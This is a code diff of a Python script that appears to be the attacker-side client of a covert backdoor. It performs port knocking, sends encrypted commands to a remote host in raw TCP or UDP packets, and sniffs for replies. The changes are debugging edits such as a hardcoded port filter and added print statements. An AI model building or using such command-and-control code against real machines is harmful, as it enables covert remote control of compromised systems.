@@ -36,15 +36,16 @@ def sendCommand():
     cmd = input("Enter command: ")
     payload = encryption.encrypt(config.password + cmd)
     if protocol.upper() == 'TCP':
-        packet = IP(dst=config.remoteIP, src=config.localIP)/TCP(dport=config.remotePort, sport=config.localPort)/Raw(load=payload)
+        packet = IP(dst=remoteIP, src=localIP)/TCP(dport=remotePort, sport=localPort)/Raw(load=payload)
     elif protocol.upper() == 'UDP':
-        packet = IP(dst=config.remoteIP, src=config.localIP)/UDP(dport=config.remotePort, sport=config.localPort)/Raw(load=payload)
+        packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)/Raw(load=payload)
     send(packet, verbose=True)
 
 def parsePacket(packet):
     """
     """
-    if packet.haslayer(protocol):
+    packet.show()
+    if packet.haslayer(protocol.upper()):
         if packet.haslayer(Raw):
             payload = packet[Raw].load
             print("Payload: %s" % payload)
@@ -60,18 +61,21 @@ def is_incoming(packet):
     return packet[Ether].src != hardwareAddr
 
 def listen(mFilter):
-    sniff(lfilter=is_incoming, filter=mFilter, prn=parsePacket, count=1)
+    print("Sniffing...")
+    sniff(filter=mFilter, prn=parsePacket, count=1)
+    print("Sniffed...")
 
 def main():
     mFilter = protocol + " src port " + str(remotePort) + " and dst port " + \
             str(localPort) + " and src host " + remoteIP
+    testFilter = "tcp src port 8505"
     try:
         checkRootPrivilege()
         portKnocking()
         while True:
             sendCommand()
             print(mFilter)
-            listen(mFilter)
+            listen(testFilter)
     except KeyboardInterrupt:
         print('Attacker closing...\n')
         sys.exit(0)
